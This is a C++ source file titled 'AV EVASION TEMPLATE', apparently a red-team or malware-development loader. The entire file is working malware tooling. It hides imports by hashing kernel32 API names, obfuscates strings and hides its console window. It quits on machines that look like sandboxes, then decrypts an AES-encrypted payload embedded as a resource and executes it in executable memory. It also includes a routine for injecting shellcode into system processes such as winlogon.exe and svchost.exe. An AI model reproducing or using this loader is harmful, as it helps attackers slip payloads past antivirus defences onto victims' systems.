/*
AV EVASION TEMPLATE
Thanks to:
https://0xpat.github.io/Malware_development_part_2/
https://0xpat.github.io/Malware_development_part_4/
https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html
*/

#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#include "skc.hpp"

#include "extern/aes.h"

// API hashing
typedef HRSRC(WINAPI* PFindResource)(HMODULE, LPCSTR, LPCSTR);
typedef DWORD(WINAPI* PSizeofResource)(HMODULE, HRSRC);
typedef PVOID(WINAPI* PLoadResource)(HMODULE, HRSRC);
typedef PVOID(WINAPI* PLockResource)(HGLOBAL);
typedef PVOID(WINAPI* PFreeResource)(HGLOBAL);
typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef PVOID(WINAPI* PGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* PGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HANDLE(WINAPI* PCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI* POpenProcess)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI* PVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* PWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* PCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* PCloseHandle)(HANDLE);
typedef HANDLE(WINAPI* PCreateToolhelp32Snapshot)(DWORD, DWORD);

PFindResource fFindResource;
PSizeofResource fSizeofResource;
PLoadResource fLoadResource;
PLockResource fLockResource;
PFreeResource fFreeResource;
PVirtualAlloc fVirtualAlloc;
PVirtualFree fVirtualFree;
PGetSystemInfo fGetSystemInfo;
PGlobalMemoryStatusEx fGlobalMemoryStatusEx;
PCreateFileW fCreateFileW;
PDeviceIoControl fDeviceIoControl;
POpenProcess fOpenProcess;
PVirtualAllocEx fVirtualAllocEx;
PWriteProcessMemory fWriteProcessMemory;
PCreateRemoteThread fCreateRemoteThread;
PCloseHandle fCloseHandle;
PCreateToolhelp32Snapshot fCreateToolhelp32Snapshot;

// Djb2 hash function for API hashing
unsigned int HashDjb2(std::string str) {
    unsigned int hash = 9491;
    for (int c: str) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Locate PID of process
DWORD LocateProcess(const char* process) {
    DWORD pid = 0;
    HANDLE hSnapshot = fCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strcmp(pe32.szExeFile, process) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        fCloseHandle(hSnapshot);
    }
    return pid;
}

// Inject shellcode function
std::vector<std::string> hostProcNames = {SKC("sihost.exe"), SKC("audiodg.exe"), SKC("svchost.exe"), SKC("winlogon.exe"), SKC("ctfmon.exe"), SKC("services.exe"), SKC("conhost.exe")};
bool InjectShellcodeToAny(unsigned char* payload, DWORD dwSize) {

    // Find process to inject
    std::vector<DWORD> dwHostProcs;
    for (std::string procName: hostProcNames) {
        DWORD pid;
        if ((pid = LocateProcess(procName.c_str())) != 0) {
            dwHostProcs.push_back(pid);
        }
    }
    if (!dwHostProcs.size()) return false;
    
    // Keep trying
    for (int i = 0; i != dwHostProcs.size(); i++) {
        std::cout << "inject: " << dwHostProcs[i] << "\n";
        HANDLE hInjectProc = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwHostProcs[i]);
        if (hInjectProc == NULL || hInjectProc == INVALID_HANDLE_VALUE) {
            std::cout << GetLastError() << "\n";
            continue;
        }
        void* lpMem = fVirtualAllocEx(hInjectProc, NULL, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!lpMem) {
            std::cout << GetLastError() << "\n";
            continue;
        }
        DWORD dwWritten;
        if (!fWriteProcessMemory(hInjectProc, lpMem, payload, dwSize, (SIZE_T*) &dwWritten)) {
            std::cout << GetLastError() << "\n";
            continue;
        }
        HANDLE hThread = fCreateRemoteThread(hInjectProc, NULL, 0, (LPTHREAD_START_ROUTINE) lpMem, NULL, 0, NULL);
        if (!hThread) {
            std::cout << GetLastError() << "\n";
            continue;
        }
        fCloseHandle(hThread);
        std::cout << "success\n";
        return true;
    }
    return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Get Kernel32
    PPEB pPEB = (PPEB) __readgsqword(0x60);
    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
    PLIST_ENTRY listCurrent = listHead->Flink;
    PVOID kernel32Address;
    do {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
        PCHAR dllName = (PCHAR) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
        CharUpperA(dllName);
        if (strstr(dllName, SKCR("KERNEL32.DLL"))) {
            kernel32Address = dllEntry->DllBase;
            HeapFree(GetProcessHeap(), 0, dllName);
            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);
        listCurrent = listCurrent->Flink;
    } while (listCurrent != listHead);

    // Resolve functions
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) kernel32Address;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS) ((PBYTE) kernel32Address + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) &(pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNameOrdinals);

    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
        PCSTR pFunctionName = (PSTR) ((PBYTE) kernel32Address + pAddressOfNames[i]);
        if (HashDjb2(pFunctionName) == 0x7ff6a4a5) {
            fVirtualAlloc = (PVirtualAlloc) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x7d8d84fd) {
            fFindResource = (PFindResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x70dbb8eb) {
            fSizeofResource = (PSizeofResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x24a8ee5b) {
            fLoadResource = (PLoadResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x5c2527a4) {
            fLockResource = (PLockResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x13b1935d) {
            fFreeResource = (PFreeResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x49b4fa7c) {
            fVirtualFree = (PVirtualFree) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xc42626c4) {
            fGetSystemInfo = (PGetSystemInfo) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x230fd4fe) {
            fGlobalMemoryStatusEx = (PGlobalMemoryStatusEx) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xcebbf15e) {
            fCreateFileW = (PCreateFileW) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x2da631c) {
            fDeviceIoControl = (PDeviceIoControl) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x545c2924) {
            fOpenProcess = (POpenProcess) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x58326b42) {
            fVirtualAllocEx = (PVirtualAllocEx) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xc1789056) {
            fWriteProcessMemory = (PWriteProcessMemory) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xfc861eeb) {
            fCreateRemoteThread = (PCreateRemoteThread) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x1b95f555) {
            fCloseHandle = (PCloseHandle) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x5509aca3) {
            fCreateToolhelp32Snapshot = (PCreateToolhelp32Snapshot) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    // Quit if sandboxed

    // Check CPU > 2 cores
    SYSTEM_INFO si;
    fGetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 4) {
        return 0;
    }

    // Check RAM > 4GB
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    fGlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys / 1024 / 1024 < 4096) {
        return 0;
    }

    // Check HDD > 100GB
    HANDLE hDevice = fCreateFileW(SKCR(L"\\\\.\\PhysicalDrive0"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD dwBytes;
    fDeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &dwBytes, (LPOVERLAPPED) NULL);
    if (pDiskGeometry.Cylinders.QuadPart * (ULONG) pDiskGeometry.TracksPerCylinder * (ULONG) pDiskGeometry.SectorsPerTrack * (ULONG) pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024 < 100) {
        return 0;
    }

    // Load resource (the executable)
    HRSRC hResource = fFindResource(NULL, MAKEINTRESOURCE(101), SKCR("RT_RCDATA"));
    DWORD dwSize = fSizeofResource(NULL, hResource);
    HGLOBAL hResData = fLoadResource(NULL, hResource);
    LPVOID pData = fLockResource(hResData);
    std::vector<unsigned char> payload((unsigned char*) pData, (unsigned char*) (pData) + dwSize);
    fFreeResource(hResData);

    // Decrypt AES encrypted shellcode
    unsigned char* _key = (unsigned char*) SKCC("\x36\x0A\x34\xF9\xDD\x4D\xE1\xF5\xF7\x62\xA8\x5B\x34\x82\x7A\x24");
    unsigned char* _iv = (unsigned char*) SKCC("\x6B\xB0\x12\xD6\x64\x87\xC8\xD9\x11\x25\x1C\xB8\xFE\xC8\x06\x48");
    std::vector<unsigned char> key(_key, _key + 16);
    std::vector<unsigned char> iv(_iv, _iv + 16);
    AES aes(AESKeyLength::AES_128);
    payload = aes.DecryptCBC(payload, key, iv);

    // Run in current process is a failsafe
    // if (InjectShellcodeToAny(&payload[0], dwSize)) return 0;

    // Allocate memory
    void* lpMem = fVirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpMem, payload.data(), dwSize);

    // Execute shellcode
    ((void(*)()) lpMem)();

    // Cleanup
    fVirtualFree(lpMem, 0, MEM_RELEASE);
    return 0;
}